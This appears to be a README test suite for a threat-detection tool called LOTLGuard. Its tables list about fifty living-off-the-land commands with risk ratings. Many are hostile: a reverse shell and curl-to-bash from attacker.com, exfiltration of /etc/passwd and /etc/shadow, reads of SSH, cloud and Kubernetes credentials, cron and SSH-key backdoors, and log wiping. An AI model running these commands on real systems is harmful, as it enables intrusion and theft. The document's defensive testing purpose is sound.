# 🧪 LOTLGuard - The "Big 50" Test Suite

Use these 50+ commands in the **Shared Kernel Terminal (Port 5051)** to verify detection, risk ranking, and incident response.

---

## 🔎 1. Discovery & Reconnaissance (Low/Medium Risk)
*Goal: Understand the environment. These should be monitored as potential "early signals".*

| ID | Objective | Command | Risk |
|----|-----------|---------|------|
| D01 | Current User | `whoami` | Low |
| D02 | Hostname | `hostname` | Low |
| D03 | System Info | `uname -a` | Low |
| D04 | Directory List | `ls -la /` | Low |
| D05 | Process List | `ps aux` | Low |
| D06 | Network Config | `ifconfig -a` | Low |
| D07 | TCP Connections | `netstat -antp` | Medium |
| D08 | Routing Table | `route -n` | Medium |
| D09 | DNS Config | `cat /etc/resolv.conf` | Low |
| D10 | Installed Packages | `dpkg -l` | Low |
| D11 | CPU Info | `lscpu` | Low |
| D12 | Memory Usage | `free -m` | Low |
| D13 | Sockets | `ss -tulpn` | Medium |
| D14 | IP Addresses | `ip addr show` | Low |
| D15 | Users List | `cat /etc/passwd` | Medium |

---

## 🔑 2. Credential Access (High/Critical Risk)
*Goal: Steal identities and secrets. These should trigger immediate High/Critical alerts.*

| ID | Objective | Command | Risk |
|----|-----------|---------|------|
| C01 | Shadow File | `cat /etc/shadow` | **Critical** |
| C02 | SSH Private Keys | `cat ~/.ssh/id_rsa` | **Critical** |
| C03 | K8s Secrets | `cat /var/run/secrets/kubernetes.io/serviceaccount/token` | **Critical** |
| C04 | AWS/Cloud Meta | `curl http://169.254.169.254/latest/meta-data/` | **Critical** |
| C05 | Environment Vars | `env` | High |
| C06 | .bash_history | `cat ~/.bash_history` | High |
| C07 | Config Files | `find /etc -name "*.conf"` | Medium |
| C08 | Docker Inspect | `docker inspect any-pod` | High |
| C09 | AWS Credentials | `cat ~/.aws/credentials` | **Critical** |
| C10 | Kubeconfig | `cat ~/.kube/config` | **Critical** |

---

## 🛠️ 3. Persistence & Privilege Escalation (High Risk)
*Goal: Stay in the system or gain root access.*

| ID | Objective | Command | Risk |
|----|-----------|---------|------|
| P01 | Cronjob Backdoor | `echo "* * * * * root /tmp/shell.sh" >> /etc/crontab` | High |
| P02 | SUID Search | `find / -perm -4000 2>/dev/null` | Medium |
| P03 | Sudo Version | `sudo --version` | Low |
| P04 | List Sudo Privs | `sudo -l` | Medium |
| P05 | Modification Logs | `touch -t 202001010101 /etc/passwd` | High |
| P06 | New User Add | `useradd backdoor_user` | High |
| P07 | SSH Authorized Keys | `echo "ssh-rsa AAA..." >> ~/.ssh/authorized_keys` | High |
| P08 | Systemd Backdoor | `systemctl enable malicious.service` | High |

---

## 🚀 4. Execution & Lateral Movement (Critical Risk)
*Goal: Run malicious code or move to other nodes.*

| ID | Objective | Command | Risk |
|----|-----------|---------|------|
| E01 | Reverse Shell | `bash -i >& /dev/tcp/attacker.com/4444 0>&1` | **Critical** |
| E02 | Netcat Listener | `nc -lvp 9999` | **Critical** |
| E03 | Remote Script EXE | `curl http://attacker.com/malicious.sh | bash` | **Critical** |
| E04 | SSH Brute Force | `ssh-keygen -t rsa -N "" -f /tmp/id_rsa` | Medium |
| E05 | Dig/DNS Recon | `dig @8.8.8.8 any internal-service.local` | Medium |
| E06 | Ping Sweep | `nmap -sn 10.0.0.0/24` | High |
| E07 | Remote File Retrieval | `wget http://attacker.com/payload.exe -O /tmp/payload.exe` | High |
| E08 | Base64 Execution | `echo "Y2F0IC9ldGMvc2hhZG93" | base64 -d | bash` | **Critical** |

---

## 💾 5. Exfiltration & Defense Evasion (High/Critical Risk)
*Goal: Steal data or hide tracks.*

| ID | Objective | Command | Risk |
|----|-----------|---------|------|
| X01 | Log Suppression | `rm -rf /var/log/syslog` | High |
| X02 | History Wipe | `history -c` | High |
| X03 | Data Upload (POST) | `curl -X POST -d @/etc/passwd http://attacker.com/` | **Critical** |
| X04 | Archive Sensitive Data | `tar -czvf /tmp/secrets.tar.gz /etc/` | High |
| X05 | SCP Exfil | `scp /etc/shadow attacker@remote:/tmp/` | **Critical** |
| X06 | Process Rename | `mv /tmp/shell /usr/bin/top` | High |
| X07 | Disable Security | `ufw disable` | High |
| X08 | Clear Temp Data | `rm -rf /tmp/*` | Medium |
| X09 | DNS Exfiltration | `dig @8.8.8.8 $(cat /etc/passwd | base64).attacker.com` | **Critical** |

---

---

## 🚀 6. Real Attack Simulator (Bulk Injection)
Standardized attacks can also be bulk-injected using the automated script:
```bash
bash attack_simulation/real_attack_simulator.sh
```

## 📜 8. Expected Terminal Output (Backend)
When you run commands or take actions, look for these specific logs in your terminal (or `dashboard.log` / `shared_kernel.log`):

### A. When Running a Command (Shared Kernel Terminal)
```log
[SHARED_KERNEL] Executing command: cat /etc/shadow
[INCIDENT_RESPONSE] CRITICAL Risk -> CRITICAL: Container 'shared-kernel' isolated immediately. Pod quarantined!
```

### B. When Manually Killing a Pod (Dashboard UI)
```log
[MITIGATION] Request to KILL POD: 'shared-kernel' for command: cat /etc/shadow
⚠️ [SIMULATED] Simulated Termination: Pod 'shared-kernel' removed from SOC view. (Reason: Simulation Mode)
```

### C. When Resetting Dashboard Stats
```log
[SOC_ACTION] Dashboard statistics and session logs reset.
```

### D. When Wiping Forensic Logs
```log
[SOC_ACTION] Forensic logs wiped by administrator.
```

## ✅ 9. How to Verify Mitigation is Working

When you click **"Kill Process"** or **"Quarantine Pod"** in the SOC Dashboard, here is how you confirm it worked:

### A. Simulated Mitigation (Shared Kernel / Unknown Pods)
Since the simulation shouldn't crash your host, we use **Simulated Fallback**:
1.  **Check Dashboard History**: Click the **"Session Logs"** or **"Forensic History"** tab. You should see a new entry: `Action: Killed Pod (Simulated) | Target: shared-kernel`.
2.  **Check Backend Terminal**: Look for `[MITIGATION]` and `⚠️ [SIMULATED]` logs. This proves the SOC command was received and processed.

### B. Real-Time Mitigation (Kubernetes Pods)
If you attack a real pod like `web-app`:
1.  **Run Watch Command**: Open a terminal and run `kubectl get pods -w`.
2.  **Trigger Action**: Click the **Skull** icon in the dashboard for a `web-app` event.
3.  **Witness Termination**: You will see the pod status change to `Terminating` and then a new pod will be created.

---
*LOTLGuard Team | Enterprise Threat Hunting & Incident Response*
